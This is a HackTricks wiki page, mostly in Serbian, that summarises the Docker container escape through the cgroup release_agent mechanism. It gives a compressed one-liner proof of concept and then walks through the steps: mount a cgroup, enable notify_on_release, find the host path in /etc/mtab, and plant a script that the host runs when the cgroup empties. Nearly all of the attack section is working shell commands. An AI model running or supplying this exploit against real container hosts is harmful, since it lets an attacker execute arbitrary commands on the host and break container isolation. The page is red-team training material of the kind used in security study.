# Docker release\_agent cgroups escape

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


**Za više detalja, pogledajte** [**originalni blog post**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Ovo je samo sažetak:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
The proof of concept (PoC) demonstrates a method to exploit cgroups by creating a `release_agent` file and triggering its invocation to execute arbitrary commands on the container host. Here's a breakdown of the steps involved:

1. **Pripremite Okruženje:**
* Direktorijum `/tmp/cgrp` se kreira da služi kao tačka montiranja za cgroup.
* RDMA cgroup kontroler se montira na ovaj direktorijum. U slučaju odsustva RDMA kontrolera, predlaže se korišćenje `memory` cgroup kontrolera kao alternative.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Postavite Dete Cgroup:**
* Dete cgroup pod imenom "x" se kreira unutar montirane cgroup direktorije.
* Obaveštenja su omogućena za "x" cgroup pisanjem 1 u njegov notify\_on\_release fajl.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Konfigurišite Release Agent:**
* Putanja kontejnera na hostu se dobija iz /etc/mtab datoteke.
* release\_agent datoteka cgrupa se zatim konfiguriše da izvrši skriptu pod nazivom /cmd smeštenu na dobijenoj putanji hosta.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Kreirajte i Konfigurišite /cmd Skriptu:**
* Skripta /cmd se kreira unutar kontejnera i konfiguriše se da izvršava ps aux, preusmeravajući izlaz u datoteku pod imenom /output u kontejneru. Puni put do /output na hostu je specificiran.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Pokreni Napad:**
* Proces se pokreće unutar "x" child cgroup i odmah se prekida.
* Ovo pokreće `release_agent` (skriptu /cmd), koja izvršava ps aux na hostu i zapisuje izlaz u /output unutar kontejnera.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
